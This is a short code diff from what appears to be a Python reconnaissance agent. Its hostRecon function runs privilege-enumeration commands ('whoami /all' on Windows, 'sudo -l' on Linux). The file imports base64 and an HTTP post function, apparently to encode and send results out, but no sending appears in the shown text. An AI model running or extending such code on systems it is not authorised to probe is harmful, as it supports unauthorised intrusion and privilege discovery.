@@ -4,11 +4,17 @@
 import base64, sys
 from subprocess import PIPE, Popen
 from requests.api import post
+from platform import system
 
 def hostRecon():
     # mengumpulkan informasi mengenai Hostname, User yang login, dan Current Privileges
-    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-    result, err = process.communicate()
+    if system() == "Windows":
+        process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+        result, err = process.communicate()
+        
+    elif system() == "Linux":
+        process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
+        result, err = process.communicate()
     
     # jika terdapat error maka code akan langsung dihentikan
     if err != b'':
